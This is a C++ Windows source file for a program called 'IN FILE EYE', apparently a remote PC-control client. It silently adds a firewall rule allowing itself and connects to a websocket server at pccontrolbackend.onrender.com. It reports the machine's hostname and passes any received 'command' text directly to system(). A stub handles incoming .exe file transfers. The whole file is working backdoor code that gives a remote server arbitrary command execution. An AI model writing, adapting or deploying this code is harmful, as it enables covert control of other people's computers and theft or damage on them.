#include <iostream>
#include <fstream>
#include <string>
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>
#include <nlohmann/json.hpp>
#include <filesystem>
#include <exception>

using json = nlohmann::json;
using namespace std;
namespace fs = filesystem;


#ifdef _WIN32
    #include <Windows.h>
#else
    #include <unistd.h>
#endif

string getComputerName() {
    char name[256];
#ifdef _WIN32
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name);
    }
#else
    if (gethostname(name, sizeof(name)) == 0) {
        return std::string(name);
    }
#endif
    return "Unknown";
}


string getExePath(){
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL,buffer,MAX_PATH);
    return string(buffer);
}


void ErrorNotiffication(const char* message){
    char buffer[255];
    MessageBoxA(NULL,message, "IN FILE EYE" ,MB_ICONERROR | MB_OK);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
// int main()
{
    string command_netsh = "netsh advfirewall firewall add rule name=\"Eye rule\" dir=in action=allow program=\"" + getExePath() +  "\" enable=yes profile=public";
    system(command_netsh.c_str());
    
    
    string BASE_URL = "wss://pccontrolbackend.onrender.com/openC";

    
    cout << BASE_URL << endl;
    ix::initNetSystem();
    ix::WebSocket webSocket;
    
    ix::SocketTLSOptions tlsOptions;
    tlsOptions.tls = true;
    cout << tlsOptions.getDescription() << endl;

    webSocket.setTLSOptions(tlsOptions);

    webSocket.setUrl(BASE_URL); 
    
    bool isConnect = false;
    
    webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
         if (msg->type == ix::WebSocketMessageType::Open) {
            isConnect = true;
            
        } else if (msg->type == ix::WebSocketMessageType::Close) {
            isConnect = false;
            
        } 
        if(msg->type == ix::WebSocketMessageType::Message){
            if(!isConnect){
                cout << "from server: " << msg->str << endl;
                isConnect = true;
            }else{
              try{  
                json data = json::parse(msg->str);

                string type = data["type"];
                if(type == "command"){
                    string text = data["text"];
                    system(text.c_str());
// "type": "file"
// "text": "start https://..."
                    }
                if(type == "file"){
                    string filename = data["filename"];
// "type": "file"
// "filename": "".exe
// "data": 0010101010100101010
                }
            } catch(exception& e){
                // cout << e.what() << endl;
            }
         
            }
        }
    });
    
    webSocket.start();
    
    string pc_name = getComputerName();

    json send_data;
    send_data["name"] = pc_name;
    

    while(true){
        if(isConnect){
        //   cout << '.';
        }else{
          webSocket.send(send_data.dump());  
        //   cout << send_data["key"] << endl;
        //   cout << send_data["name"] << endl;
        }
        this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    
    webSocket.stop();
    ix::uninitNetSystem();
    return 0;
}
